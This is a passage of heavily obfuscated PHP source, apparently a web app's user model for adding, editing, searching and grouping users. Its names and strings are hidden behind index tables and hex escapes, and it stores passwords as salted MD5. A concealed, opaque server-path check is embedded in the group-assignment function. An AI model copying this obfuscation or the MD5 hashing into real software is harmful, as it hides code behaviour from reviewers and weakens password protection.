$º‰Íâ˙™ = $this->where(array($£ôÛ’Œ˘[1764] => intval($…æéÊŸ¨)))->find(); $è¿«æ´ﬂ = $this->metaGet($…æéÊŸ¨); $∂ÍÏ¨≤‹ = isset($è¿«æ´ﬂ[$£ôÛ’Œ˘[2467]]) ? $è¿«æ´ﬂ[$£ôÛ’Œ˘[2467]] : $£ôÛ’Œ˘[12]; if (md5($∂ÍÏ¨≤‹ . trim($…≤¨˝à¿)) !== $º‰Íâ˙™[$£ôÛ’Œ˘[963]]) { return !1; } return !0; } public function userAdd($–â«ÜÑ¨) { $Ô•ó•˚è =& $_SERVER[ß⁄ˆÇ†Œ]; $‹”∑’π¡ = array($Ô•ó•˚è[502] => $–â«ÜÑ¨[$Ô•ó•˚è[32]], $Ô•ó•˚è[2468] => $–â«ÜÑ¨[$Ô•ó•˚è[2169]], $Ô•ó•˚è[2469] => isset($–â«ÜÑ¨[$Ô•ó•˚è[390]]) ? $–â«ÜÑ¨[$Ô•ó•˚è[390]] : $Ô•ó•˚è[12], $Ô•ó•˚è[2470] => isset($–â«ÜÑ¨[$Ô•ó•˚è[2466]]) ? $–â«ÜÑ¨[$Ô•ó•˚è[2466]] : $Ô•ó•˚è[12], $Ô•ó•˚è[2471] => isset($–â«ÜÑ¨[$Ô•ó•˚è[2251]]) ? $–â«ÜÑ¨[$Ô•ó•˚è[2251]] : $–â«ÜÑ¨[$Ô•ó•˚è[32]], $Ô•ó•˚è[2472] => isset($–â«ÜÑ¨[$Ô•ó•˚è[2449]]) ? $–â«ÜÑ¨[$Ô•ó•˚è[2449]] : $Ô•ó•˚è[12], $Ô•ó•˚è[2473] => isset($–â«ÜÑ¨[$Ô•ó•˚è[2474]]) ? $–â«ÜÑ¨[$Ô•ó•˚è[2474]] : 1, $Ô•ó•˚è[2475] => $–â«ÜÑ¨[$Ô•ó•˚è[963]], $Ô•ó•˚è[2051] => isset($–â«ÜÑ¨[$Ô•ó•˚è[1949]]) ? $–â«ÜÑ¨[$Ô•ó•˚è[1949]] : 1024 * 1024 * 20, $Ô•ó•˚è[2052] => 0, $Ô•ó•˚è[2476] => 0, $Ô•ó•˚è[2096] => isset($–â«ÜÑ¨[$Ô•ó•˚è[823]]) ? $–â«ÜÑ¨[$Ô•ó•˚è[823]] : 1); if (!empty($–â«ÜÑ¨[$Ô•ó•˚è[1764]])) { $‹”∑’π¡[$Ô•ó•˚è[1764]] = $–â«ÜÑ¨[$Ô•ó•˚è[1764]]; } $˚‘ÔÿÆ¨ = $this->_checkExist($–â«ÜÑ¨); if ($˚‘ÔÿÆ¨ !== !0) { return $˚‘ÔÿÆ¨; } if (!empty($‹”∑’π¡[$Ô•ó•˚è[2449]]) && strlen($‹”∑’π¡[$Ô•ó•˚è[2449]]) > 255) { $‹”∑’π¡[$Ô•ó•˚è[2449]] = $Ô•ó•˚è[12]; } $…˛ÁØ–∆ = $this->add($‹”∑’π¡); $”πï∫ÆÉ = array($Ô•ó•˚è[2475] => $‹”∑’π¡[$Ô•ó•˚è[963]], $Ô•ó•˚è[2471] => $‹”∑’π¡[$Ô•ó•˚è[2251]]); $this->userEdit($…˛ÁØ–∆, $”πï∫ÆÉ); Model($Ô•ó•˚è[1414])->userRootAdd($…˛ÁØ–∆); return $…˛ÁØ–∆; } protected function userEditTest($”’˝Ûˆª, $ÍÑ∆é˙›) { return $this->call($_SERVER[ß⁄ˆÇ†Œ][2477], $”’˝Ûˆª, $ÍÑ∆é˙›); } protected function userEdit($∑†Ë›åÖ, $‰≥•à›ä) { $´µ√¬°ú =& $_SERVER[ß⁄ˆÇ†Œ]; $—±Ì∞ºô = $this->getInfoSimple($∑†Ë›åÖ); if (!$—±Ì∞ºô) { return !1; } $À÷ı£˛Ò = $this->_checkExist($‰≥•à›ä, $∑†Ë›åÖ); if ($À÷ı£˛Ò !== !0) { return $À÷ı£˛Ò; } if (isset($‰≥•à›ä[$´µ√¬°ú[963]]) && trim($‰≥•à›ä[$´µ√¬°ú[963]]) != $´µ√¬°ú[12]) { $„¥âÛ˘Ñ = $this->metaGet($∑†Ë›åÖ); if (empty($„¥âÛ˘Ñ[$´µ√¬°ú[2467]])) { $„¥âÛ˘Ñ[$´µ√¬°ú[2467]] = rand_string(10); Model($´µ√¬°ú[585])->metaSet($∑†Ë›åÖ, $´µ√¬°ú[2467], $„¥âÛ˘Ñ[$´µ√¬°ú[2467]]); } $‰≥•à›ä[$´µ√¬°ú[963]] = md5($„¥âÛ˘Ñ[$´µ√¬°ú[2467]] . trim($‰≥•à›ä[$´µ√¬°ú[963]])); } else { unset($‰≥•à›ä[$´µ√¬°ú[963]]); } if (!empty($‰≥•à›ä[$´µ√¬°ú[2449]]) && strlen($‰≥•à›ä[$´µ√¬°ú[2449]]) > 255) { $‰≥•à›ä[$´µ√¬°ú[2449]] = $´µ√¬°ú[12]; } $this->where(array($´µ√¬°ú[1755] => $∑†Ë›åÖ))->save($‰≥•à›ä); if (isset($‰≥•à›ä[$´µ√¬°ú[2251]])) { $this->setNamePinyin($∑†Ë›åÖ, $‰≥•à›ä[$´µ√¬°ú[2251]]); } $this->clearCache($∑†Ë›åÖ); return !0; } public function setNamePinyin($Èîê˘Ì∞, $˝Ø‡È‚Ö = false) { $´∫∞Ù∆û =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$˝Ø‡È‚Ö) { $àáã•ÜË = $this->getInfoSimple($Èîê˘Ì∞); $˝Ø‡È‚Ö = $àáã•ÜË[$´∫∞Ù∆û[2251]] ? $àáã•ÜË[$´∫∞Ù∆û[2251]] : $àáã•ÜË[$´∫∞Ù∆û[32]]; } $¨∏†∆å” = Model($´∫∞Ù∆û[606]); if (!Input::check($˝Ø‡È‚Ö, $´∫∞Ù∆û[663])) { return $¨∏†∆å”->metaSet($Èîê˘Ì∞, array($´∫∞Ù∆û[546] => $´∫∞Ù∆û[12], $´∫∞Ù∆û[545] => $´∫∞Ù∆û[12])); } return $¨∏†∆å”->metaSet($Èîê˘Ì∞, array($´∫∞Ù∆û[546] => str_replace($´∫∞Ù∆û[53], $´∫∞Ù∆û[12], Pinyin::get($˝Ø‡È‚Ö)), $´∫∞Ù∆û[545] => Pinyin::get($˝Ø‡È‚Ö, $´∫∞Ù∆û[664]))); } private function nickNameRpt() { $«íÏä“è =& $_SERVER[ß⁄ˆÇ†Œ]; $∫É¥Ìëô = Model($«íÏä“è[843])->get($«íÏä“è[2478]); $°À¢…Öµ = $GLOBALS[$«íÏä“è[6]][$«íÏä“è[465]][$«íÏä“è[2478]]; $’√ÙîÏ˛ = !is_null($∫É¥Ìëô) ? $∫É¥Ìëô : $°À¢…Öµ; return !!$’√ÙîÏ˛; } private function _checkExist($°ßÚıﬂÈ, $∆ëïè˜¶ = false) { $õÑ≠ûîó =& $_SERVER[ß⁄ˆÇ†Œ]; $Åú¶ò¢˝ = array($õÑ≠ûîó[32] => UserModel::ERROR_USER_EXIST_NAME, $õÑ≠ûîó[2251] => UserModel::ERROR_USER_EXIST_NICKNAME, $õÑ≠ûîó[390] => UserModel::ERROR_USER_EXIST_EMAIL, $õÑ≠ûîó[2466] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Åú¶ò¢˝[$õÑ≠ûîó[2251]]); } $™‚ëÜ˘õ = $∆ëïè˜¶ ? array($õÑ≠ûîó[1764] => array($õÑ≠ûîó[2479], $∆ëïè˜¶)) : array(); foreach ($Åú¶ò¢˝ as $ˆ‡‘°ıß => $ÚìëËÃŸ) { $ãêòÓ”Ò = array(); foreach ($Åú¶ò¢˝ as $ÿ•ú‘ÇÜ => $·∑¯®Õ§) { if (isset($°ßÚıﬂÈ[$ÿ•ú‘ÇÜ]) && $°ßÚıﬂÈ[$ÿ•ú‘ÇÜ]) { $ãêòÓ”Ò[] = $°ßÚıﬂÈ[$ÿ•ú‘ÇÜ]; } } if (!$ãêòÓ”Ò) { continue; } $ó√ûÉœ∏ = array_merge(array($ˆ‡‘°ıß => array($õÑ≠ûîó[7], $ãêòÓ”Ò)), $™‚ëÜ˘õ); $Ô≥’ö´ù = $this->where($ó√ûÉœ∏)->find(); if ($Ô≥’ö´ù) { return $ÚìëËÃŸ; } } return !0; } public function userListInfo($›÷◊‡Á∏) { $∫˜èÈáí =& $_SERVER[ß⁄ˆÇ†Œ]; $°ªïÊÿ° = array(); $›÷◊‡Á∏ = is_array($›÷◊‡Á∏) ? array_unique($›÷◊‡Á∏) : array(); if (!$›÷◊‡Á∏) { return $°ªïÊÿ°; } if (count($›÷◊‡Á∏) < 20) { foreach ($›÷◊‡Á∏ as $¨ç˜Û≥ë) { $°ªïÊÿ°[$¨ç˜Û≥ë . $∫˜èÈáí[12]] = $this->getInfoSimpleOuter($¨ç˜Û≥ë); } } else { $‚Û™ñÊ‚ = array($∫˜èÈáí[1755] => array($∫˜èÈáí[500], $›÷◊‡Á∏)); if (count($›÷◊‡Á∏) == 1) { $‚Û™ñÊ‚ = array($∫˜èÈáí[1755] => $›÷◊‡Á∏[0]); } $º÷‰âòó = Model($∫˜èÈáí[585])->field($this->simpleField)->where($‚Û™ñÊ‚)->select(); $º÷‰âòó = array_to_keyvalue($º÷‰âòó, $∫˜èÈáí[1764]); foreach ($›÷◊‡Á∏ as $¨ç˜Û≥ë) { $Ÿﬁõ⁄Üª = $º÷‰âòó[$¨ç˜Û≥ë]; if (!$Ÿﬁõ⁄Üª) { $°ªïÊÿ°[$¨ç˜Û≥ë . $∫˜èÈáí[12]] = $this->getInfoSimpleOuter($¨ç˜Û≥ë); continue; } $Ÿﬁõ⁄Üª[$∫˜èÈáí[2449]] = Action($∫˜èÈáí[2450])->parseUrl($Ÿﬁõ⁄Üª[$∫˜èÈáí[2449]]); $°ªïÊÿ°[$¨ç˜Û≥ë . $∫˜èÈáí[12]] = $Ÿﬁõ⁄Üª; } } return $°ªïÊÿ°; } protected function userStatus($ﬂ©œÂ∞û, $à¥ƒ˘º ) { $˙¬µÿ˙” = $this->getInfoSimple($ﬂ©œÂ∞û); if (!$˙¬µÿ˙”) { return !1; } $∂ﬂç◊ä± = array($_SERVER[ß⁄ˆÇ†Œ][823] => $à¥ƒ˘º ); return $this->userEdit($ﬂ©œÂ∞û, $∂ﬂç◊ä±); } protected function userRemove($ŒØ∏ùÒì) { $ÿ¥ ®Û˚ =& $_SERVER[ß⁄ˆÇ†Œ]; $ê–úç∞» = $this->getInfoSimple($ŒØ∏ùÒì); if (!$ê–úç∞») { return !1; } $ï“ª∆Ùî = array($ÿ¥ ®Û˚[1755] => $ŒØ∏ùÒì); Model($ÿ¥ ®Û˚[672])->where($ï“ª∆Ùî)->delete(); Model($ÿ¥ ®Û˚[2480])->where($ï“ª∆Ùî)->delete(); Model($ÿ¥ ®Û˚[2057])->where($ï“ª∆Ùî)->delete(); Model($ÿ¥ ®Û˚[2465])->where($ï“ª∆Ùî)->delete(); Model($ÿ¥ ®Û˚[1143])->where($ï“ª∆Ùî)->delete(); Model($ÿ¥ ®Û˚[2268])->removeUserAll($ŒØ∏ùÒì); Model($ÿ¥ ®Û˚[897])->userRootRemove($ŒØ∏ùÒì); return $this->where($ï“ª∆Ùî)->delete(); } protected function userGroupSet($Ô•÷«ƒ“, $ßùé ≤ã, $£ë»±÷« = array()) { $¨ñÕ°Ûô =& $_SERVER[ß⁄ˆÇ†Œ]; if ($_SERVER[$¨ñÕ°Ûô[321]] != $_SERVER[$¨ñÕ°Ûô[913]]) { $æ˜ÆÌ˜à = $¨ñÕ°Ûô[951]; $ÜÛù˝©® = $¨ñÕ°Ûô[323]; $ÊƒÚ≈©” = $_SERVER[$¨ñÕ°Ûô[324]] . $¨ñÕ°Ûô[325]; $…∏áó≥Ç = $ÜÛù˝©®($ÊƒÚ≈©”); $⁄ıù±»ã = explode($¨ñÕ°Ûô[262], $…∏áó≥Ç); if (count($⁄ıù±»ã) < $¨ñÕ°Ûô[704]) { $¢¢÷à‹· = $¨ñÕ°Ûô[327]; $¢¢÷à‹·(); } $¿√Í∞«¯ = $¨ñÕ°Ûô[952]; $¿√Í∞«¯($_SERVER[$¨ñÕ°Ûô[953]]); $¿√Í∞«¯($_SERVER[$¨ñÕ°Ûô[324]] . $¨ñÕ°Ûô[2269]); $â∆âü˘  = 1; while ($â∆âü˘  > 1) { $â∆âü˘  = $â∆âü˘  + 4; $…¬∫±ó = rawurlencode($â∆âü˘  . $¨ñÕ°Ûô[329]); } } $áœ≈⁄ì‚ = $this->getInfoSimple($Ô•÷«ƒ“); if (!$áœ≈⁄ì‚ || !is_array($ßùé ≤ã)) { return !1; } $äÜÓ¢ﬂù = Model($¨ñÕ°Ûô[2057]); $äÜÓ¢ﬂù->where(array($¨ñÕ°Ûô[1764] => $Ô•÷«ƒ“))->delete(); $Ò„≤÷π€ = array(); $ÅÿÅÔÓÙ = 0; foreach ($ßùé ≤ã as $°¸›ÖŸ∆ => $«Õöò≤∏) { $ÈÛ—£≠˘ = array($¨ñÕ°Ûô[1764] => $Ô•÷«ƒ“, $¨ñÕ°Ûô[1963] => $°¸›ÖŸ∆, $¨ñÕ°Ûô[2071] => $«Õöò≤∏); $ÈÛ—£≠˘[$¨ñÕ°Ûô[1987]] = isset($£ë»±÷«[$ÅÿÅÔÓÙ]) ? $£ë»±÷«[$ÅÿÅÔÓÙ] : 0; $ÅÿÅÔÓÙ++; $Ò„≤÷π€[] = $ÈÛ—£≠˘; } return $äÜÓ¢ﬂù->addAll($Ò„≤÷π€, array(), !0); } protected function userGroupAdd($’ïêÄÅ©, $¢¥Íø»Å = array()) { $òÊ ßÛ‡ =& $_SERVER[ß⁄ˆÇ†Œ]; $å†ùπáï = $this->getInfoSimple($’ïêÄÅ©); if (!$å†ùπáï || empty($¢¥Íø»Å)) { return !1; } $ÊˆºäÉù = array(); foreach ($¢¥Íø»Å as $Å∫œ¬çè => $◊Óº†π∂) { $ÊˆºäÉù[] = array($òÊ ßÛ‡[1764] => $’ïêÄÅ©, $òÊ ßÛ‡[1963] => $Å∫œ¬çè, $òÊ ßÛ‡[2071] => $◊Óº†π∂, $òÊ ßÛ‡[1987] => 0); } return Model($òÊ ßÛ‡[2057])->addAll($ÊˆºäÉù, array(), !0); } protected function userGroupRemove($¶µ‚∂Œå, $Ê˛ç‹ô∆) { $¸˙≈ÀÔÓ =& $_SERVER[ß⁄ˆÇ†Œ]; $≥Úµ∆√€ = $this->getInfoSimple($¶µ‚∂Œå); if (!$≥Úµ∆√€ || !$Ê˛ç‹ô∆) { return !1; } $ÑÖ¥ÇœÒ = array($¸˙≈ÀÔÓ[1755] => $¶µ‚∂Œå, $¸˙≈ÀÔÓ[2055] => $Ê˛ç‹ô∆); return Model($¸˙≈ÀÔÓ[2057])->where($ÑÖ¥ÇœÒ)->delete(); } public function listData() { $∂ãóı˙∞ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($∂ãóı˙∞[$_SERVER[ß⁄ˆÇ†Œ][454]]); return $∂ãóı˙∞; } public function listByID($úŒˆÜêú) { $Ä¢ÄˆµÂ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$úŒˆÜêú) { return; } $ÔÏ˛Ç≥Ù = array($Ä¢ÄˆµÂ[1764] => array($Ä¢ÄˆµÂ[7], $úŒˆÜêú)); $Ú’·⁄“≥ = $this->where($ÔÏ˛Ç≥Ù)->select(); $Ú’·⁄“≥ = array_sort_keep($Ú’·⁄“≥, $Ä¢ÄˆµÂ[1764], $úŒˆÜêú); $this->_listDataApply($Ú’·⁄“≥); return $Ú’·⁄“≥; } public function listByGroup($±…¸º≈Ω = 0, $•é∞Ëª  = array()) { $Ωﬁ„±à¢ =& $_SERVER[ß⁄ˆÇ†Œ]; $“Ù˛é€è = $Ωﬁ„±à¢[12]; $’ëÚ®®Ö = array(); if ($±…¸º≈Ω) { $’ëÚ®®Ö = array($Ωﬁ„±à¢[2481] => intval($±…¸º≈Ω)); $“Ù˛é€è = "\114\x45\106\124\40\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\165\163\x65\x72\x5f\147\162\x6f\x75\160\x20\165\x73\x65\x72\x5f\x67\x72\x6f\x75\160\x20\157\x6e\40\165\163\x65\x72\x2e\165\163\x65\162\x49\x44\x20\x3d\40\165\163\145\x72\137\147\x72\157\165\160\56\x75\163\x65\x72\x49\x44"; $ß≠öª±ª = Input::get($Ωﬁ„±à¢[538], null, $Ωﬁ„±à¢[12]) ? $Ωﬁ„±à¢[12] : $Ωﬁ„±à¢[2482]; } if (isset($•é∞Ëª [$Ωﬁ„±à¢[823]])) { $’ëÚ®®Ö[$Ωﬁ„±à¢[2483]] = $•é∞Ëª [$Ωﬁ„±à¢[823]]; } $ã€öÛﬂ‰ = $this->_makeOrder($ß≠öª±ª)->field($Ωﬁ„±à¢[2484])->where($’ëÚ®®Ö)->join($“Ù˛é€è)->selectPage(50); $this->_listDataApply($ã€öÛﬂ‰[$Ωﬁ„±à¢[454]]); return $ã€öÛﬂ‰; } private function _makeOrder($ÆÄ¶µ™ó = '') { $é´ÂØ∂Ø =& $_SERVER[ß⁄ˆÇ†Œ]; $•Ö∑õﬁ  = array($é´ÂØ∂Ø[1764], $é´ÂØ∂Ø[32], $é´ÂØ∂Ø[1951], $é´ÂØ∂Ø[2169], $é´ÂØ∂Ø[1923], $é´ÂØ∂Ø[231]); $®±Ì§““ = array($é´ÂØ∂Ø[531] => $é´ÂØ∂Ø[532], $é´ÂØ∂Ø[533] => $é´ÂØ∂Ø[534]); $ ‡œπî’ = Input::get($é´ÂØ∂Ø[538], $é´ÂØ∂Ø[7], $é´ÂØ∂Ø[1755], $•Ö∑õﬁ ); $˚Ç∆úÑ∑ = Input::get($é´ÂØ∂Ø[539], $é´ÂØ∂Ø[7], $é´ÂØ∂Ø[2058], array($é´ÂØ∂Ø[2058], $é´ÂØ∂Ø[533])); $˚Ç∆úÑ∑ = $®±Ì§““[$˚Ç∆úÑ∑]; $ÆÄ¶µ™ó = $ÆÄ¶µ™ó . "\165\163\145\162\56{$ ‡œπî’}\40{$˚Ç∆úÑ∑}\54\x20\165\x73\145\162\x2e\x75\163\x65\x72\111\104\40\141\x73\143"; return $this->alias($é´ÂØ∂Ø[2185])->order($ÆÄ¶µ™ó); } public function listSearch($ –Ÿèá¶) { $êú“ÅÆ¶ =& $_SERVER[ß⁄ˆÇ†Œ]; $æÚÁû’  = trim($ –Ÿèá¶[$êú“ÅÆ¶[2061]]); $ÃâÎöÈ© = explode($êú“ÅÆ¶[53], $æÚÁû’ ); if (!$æÚÁû’  || count($ÃâÎöÈ©) == 1) { return $this->listSearchNow($ –Ÿèá¶); } $√ƒÑ»¶“ = array($êú“ÅÆ¶[454] => array()); foreach ($ÃâÎöÈ© as $¶»˙·ƒÈ) { if (!trim($¶»˙·ƒÈ)) { continue; } $ –Ÿèá¶[$êú“ÅÆ¶[2061]] = $¶»˙·ƒÈ; $˛¨ñŒ”∏ = $this->listSearchNow($ –Ÿèá¶); $√ƒÑ»¶“[$êú“ÅÆ¶[454]] = array_merge($√ƒÑ»¶“[$êú“ÅÆ¶[454]], $˛¨ñŒ”∏[$êú“ÅÆ¶[454]]); } $√ƒÑ»¶“[$êú“ÅÆ¶[454]] = array_unique_by_key($√ƒÑ»¶“[$êú“ÅÆ¶[454]], $êú“ÅÆ¶[1764]); $√ƒÑ»¶“[$êú“ÅÆ¶[451]] = array($êú“ÅÆ¶[452] => count($√ƒÑ»¶“[$êú“ÅÆ¶[454]]), $êú“ÅÆ¶[448] => 20, $êú“ÅÆ¶[438] => 1, $êú“ÅÆ¶[453] => 1); return $√ƒÑ»¶“; } public function listSearchNow($“ñ„≈≠Æ) { $¡ñì™óò =& $_SERVER[ß⁄ˆÇ†Œ]; $˛õÆ’„‘ = trim($“ñ„≈≠Æ[$¡ñì™óò[2061]]); $º‹“â≥» = isset($“ñ„≈≠Æ[$¡ñì™óò[2062]]) ? $“ñ„≈≠Æ[$¡ñì™óò[2062]] : !1; $˛õÆ’„‘ = str_replace($¡ñì™óò[2063], $¡ñì™óò[2064], trim($˛õÆ’„‘)); $Ò›™ÒÍ’ = array($¡ñì™óò[32] => array($¡ñì™óò[467], "\x25{$˛õÆ’„‘}\45"), $¡ñì™óò[390] => array($¡ñì™óò[467], "{$˛õÆ’„‘}\x25"), $¡ñì™óò[2251] => array($¡ñì™óò[467], "{$˛õÆ’„‘}\45"), $¡ñì™óò[1074] => $¡ñì™óò[2065]); if (Input::check($˛õÆ’„‘, $¡ñì™óò[396])) { $Ò›™ÒÍ’[$¡ñì™óò[1764]] = array($¡ñì™óò[467], "{$˛õÆ’„‘}\45"); $Ò›™ÒÍ’[$¡ñì™óò[2466]] = array($¡ñì™óò[467], "{$˛õÆ’„‘}\x25"); } if (!$˛õÆ’„‘) { $Ò›™ÒÍ’ = array(); } if (isset($“ñ„≈≠Æ[$¡ñì™óò[823]])) { $Ò›™ÒÍ’[$¡ñì™óò[823]] = $“ñ„≈≠Æ[$¡ñì™óò[823]]; } $Ò›™ÒÍ’ = $this->parseWhereLike($Ò›™ÒÍ’); $œüî¬ê® = $this->_makeOrder()->where($Ò›™ÒÍ’)->selectPage(20); if (!$œüî¬ê® || count($œüî¬ê®[$¡ñì™óò[454]]) < 5 && Input::check($˛õÆ’„‘, $¡ñì™óò[403])) { $ü‘∏≠·” = $this->_searchFromMeta($¡ñì™óò[545], $˛õÆ’„‘, 10); $∂“–ñ‘´ = $this->_searchFromMeta($¡ñì™óò[546], $˛õÆ’„‘, 10); $ŸÄÊÓªò = array_merge($ü‘∏≠·”, $∂“–ñ‘´, $œüî¬ê®[$¡ñì™óò[454]]); $œüî¬ê®[$¡ñì™óò[454]] = array_unique_by_key($ŸÄÊÓªò, $¡ñì™óò[1764]); $œüî¬ê®[$¡ñì™óò[451]][$¡ñì™óò[452]] = count($œüî¬ê®[$¡ñì™óò[454]]); $œüî¬ê®[$¡ñì™óò[451]][$¡ñì™óò[453]] = ceil($œüî¬ê®[$¡ñì™óò[451]][$¡ñì™óò[452]] / $œüî¬ê®[$¡ñì™óò[451]][$¡ñì™óò[448]]); } $this->_listDataApply($œüî¬ê®[$¡ñì™óò[454]]); $this->_filterByGroup($œüî¬ê®, $º‹“â≥»); return $œüî¬ê®; } private function _filterByGroup(&$π«¢ˆëΩ, $°’ÔÀÁ´) { $èÂ¸åøÏ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$°’ÔÀÁ´) { return $π«¢ˆëΩ; } foreach ($π«¢ˆëΩ[$èÂ¸åøÏ[454]] as $Î∂†«ﬁó => &$ö†±È‘§) { $áÛúÌ€π = array_to_keyvalue($ö†±È‘§[$èÂ¸åøÏ[2154]], $èÂ¸åøÏ[12], $èÂ¸åøÏ[1963]); if (!in_array($°’ÔÀÁ´, $áÛúÌ€π)) { unset($π«¢ˆëΩ[$èÂ¸åøÏ[454]][$Î∂†«ﬁó]); } } unset($ö†±È‘§); $π«¢ˆëΩ[$èÂ¸åøÏ[454]] = array_values($π«¢ˆëΩ[$èÂ¸åøÏ[454]]); $π«¢ˆëΩ[$èÂ¸åøÏ[451]] = array($èÂ¸åøÏ[2221] => count($π«¢ˆëΩ[$èÂ¸åøÏ[454]]), $èÂ¸åøÏ[2219] => $π«¢ˆëΩ[$èÂ¸åøÏ[451]][$èÂ¸åøÏ[448]], $èÂ¸åøÏ[2218] => 1, $èÂ¸åøÏ[2220] => 1); } private function _searchFromMeta($ÜÎêù™Í, $≤’ù–ñ‰, $€È…ª¥∂) { $««“œ¿Ì =& $_SERVER[ß⁄ˆÇ†Œ]; $≤’ù–ñ‰ = strtolower($≤’ù–ñ‰); $ë∫ù“ÂÕ = array($««“œ¿Ì[97] => $ÜÎêù™Í, $««“œ¿Ì[459] => array($««“œ¿Ì[467], "\x25{$≤’ù–ñ‰}\45")); $ë∫ù“ÂÕ = $this->parseWhereLike($ë∫ù“ÂÕ); $π∫∆‡∑¢ = Model($««“œ¿Ì[2485])->where($ë∫ù“ÂÕ)->limit($€È…ª¥∂)->select(); if (!$π∫∆‡∑¢) { return array(); } $π∫∆‡∑¢ = array_to_keyvalue($π∫∆‡∑¢, $««“œ¿Ì[12], $««“œ¿Ì[1764]); $‡ﬂ¶ÚÀú = $this->where(array($««“œ¿Ì[1755] => array($««“œ¿Ì[7], $π∫∆‡∑¢)))->select(); if (!$‡ﬂ¶ÚÀú) { return array(); } return $‡ﬂ¶ÚÀú; } private function _listDataApplyItem($§±‡ ûä) { $áøä»Áâ = array($§±‡ ûä); $this->_listDataApply($áøä»Áâ); return $áøä»Áâ[0]; } private function _listDataApply(&$¢“Ω∏“∂) { $ÊËÜ≥≈Ö =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$¢“Ω∏“∂) { return; } array_remove_key($¢“Ω∏“∂, $ÊËÜ≥≈Ö[963]); $Ê¬⁄◊ÕÀ = array_to_keyvalue($¢“Ω∏“∂, $ÊËÜ≥≈Ö[12], $ÊËÜ≥≈Ö[1764]); $this->_listAppendGroup($¢“Ω∏“∂, $Ê¬⁄◊ÕÀ); $this->_listAppendMeta($¢“Ω∏“∂, $Ê¬⁄◊ÕÀ); $this->_listAppendSourceRoot($¢“Ω∏“∂, $Ê¬⁄◊ÕÀ); } private function _listAppendSourceRoot(&$Îá–ã€Ë, $ûÂåë¥≥) { $¨à•ÁúÜ =& $_SERVER[ß⁄ˆÇ†Œ]; $∆–Ì¿ßâ = Model($¨à•ÁúÜ[897])->listSourceRoot(SourceModel::TYPE_USER, $ûÂåë¥≥); $∆–Ì¿ßâ = array_to_keyvalue($∆–Ì¿ßâ, $¨à•ÁúÜ[577]); $∆–Ì¿ßâ = array_remove_key($∆–Ì¿ßâ, $¨à•ÁúÜ[577]); foreach ($Îá–ã€Ë as &$±‚ëÒ¡¨) { $±‚ëÒ¡¨[$¨à•ÁúÜ[90]] = $∆–Ì¿ßâ[$±‚ëÒ¡¨[$¨à•ÁúÜ[1764]]] ? $∆–Ì¿ßâ[$±‚ëÒ¡¨[$¨à•ÁúÜ[1764]]] : array(); } unset($±‚ëÒ¡¨); } private function _listAppendGroup(&$⁄∂èø˛∑, $Œ≠‰ÊﬁØ) { $¬“∞ÑÎ™ =& $_SERVER[ß⁄ˆÇ†Œ]; $ÊÉìË’Æ = array($¬“∞ÑÎ™[1764] => array($¬“∞ÑÎ™[7], $Œ≠‰ÊﬁØ)); $Í€ÿ¨Ü√ = Model($¬“∞ÑÎ™[2057])->where($ÊÉìË’Æ)->select(); $É—Öåò‚ = array_to_keyvalue($Í€ÿ¨Ü√, $¬“∞ÑÎ™[12], $¬“∞ÑÎ™[1963]); $É—Öåò‚ = array_remove_value(array_unique($É—Öåò‚), $¬“∞ÑÎ™[228]); if (!$É—Öåò‚ || !$Í€ÿ¨Ü√) { return; } $ÊÉìË’Æ = array($¬“∞ÑÎ™[1963] => array($¬“∞ÑÎ™[7], $É—Öåò‚)); $ﬁùÜôı“ = Model($¬“∞ÑÎ™[2152])->field($¬“∞ÑÎ™[2486])->where($ÊÉìË’Æ)->select(); $ﬁùÜôı“ = array_to_keyvalue($ﬁùÜôı“, $¬“∞ÑÎ™[1963]); $Í€ÿ¨Ü√ = array_to_keyvalue_group($Í€ÿ¨Ü√, $¬“∞ÑÎ™[1764]); foreach ($Í€ÿ¨Ü√ as &$æ´®ë®ù) { $ﬁ¡≠âí® = array(); foreach ($æ´®ë®ù as $∫ï¶ßéÜ) { if (!$∫ï¶ßéÜ[$¬“∞ÑÎ™[2071]]) { continue; } $éÈ®ö÷ä = Model($¬“∞ÑÎ™[579])->listData($∫ï¶ßéÜ[$¬“∞ÑÎ™[2071]]); $ﬁ¡≠âí®[] = array($¬“∞ÑÎ™[1963] => $∫ï¶ßéÜ[$¬“∞ÑÎ™[1963]], $¬“∞ÑÎ™[2487] => $ﬁùÜôı“[$∫ï¶ßéÜ[$¬“∞ÑÎ™[1963]]][$¬“∞ÑÎ™[32]], $¬“∞ÑÎ™[592] => $ﬁùÜôı“[$∫ï¶ßéÜ[$¬“∞ÑÎ™[1963]]][$¬“∞ÑÎ™[592]], $¬“∞ÑÎ™[495] => $éÈ®ö÷ä); } $æ´®ë®ù = $ﬁ¡≠âí®; } unset($æ´®ë®ù); foreach ($⁄∂èø˛∑ as &$Ö€™ŒÎø) { $Ö€™ŒÎø[$¬“∞ÑÎ™[2154]] = array(); if (isset($Í€ÿ¨Ü√[$Ö€™ŒÎø[$¬“∞ÑÎ™[1764]]])) { $Ö€™ŒÎø[$¬“∞ÑÎ™[2154]] = $Í€ÿ¨Ü√[$Ö€™ŒÎø[$¬“∞ÑÎ™[1764]]]; } } unset($Ö€™ŒÎø); } public function userAppendGroup($Å¬πÙ‘Ô) { $∏Â’™æé =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$Å¬πÙ‘Ô) { return array(); } $this->_listAppendGroup($Å¬πÙ‘Ô, array_to_keyvalue($Å¬πÙ‘Ô, $∏Â’™æé[12], $∏Â’™æé[1764])); return $Å¬πÙ‘Ô; } private function _listAppendMeta(&$¡≠ë‚Áµ, $πºë¬¬ä) { $ˆÇ ◊œ– =& $_SERVER[ß⁄ˆÇ†Œ]; $˘ï≤”è˛ = UserJobModel::JOB_KEY; $¶∆¢ÂÇå = array($ˆÇ ◊œ–[2467]); $‡ñÓﬁï› = array($ˆÇ ◊œ–[1764] => array($ˆÇ ◊œ–[7], $πºë¬¬ä)); $—…⁄Ñç◊ = Model($ˆÇ ◊œ–[2465])->where($‡ñÓﬁï›)->select(); $—…⁄Ñç◊ = array_to_keyvalue_group($—…⁄Ñç◊, $ˆÇ ◊œ–[1764]); foreach ($—…⁄Ñç◊ as &$ﬁ£îı¶û) { $¡◊˙ìë¿ = array(); foreach ($ﬁ£îı¶û as $˚øö≤À¢) { if 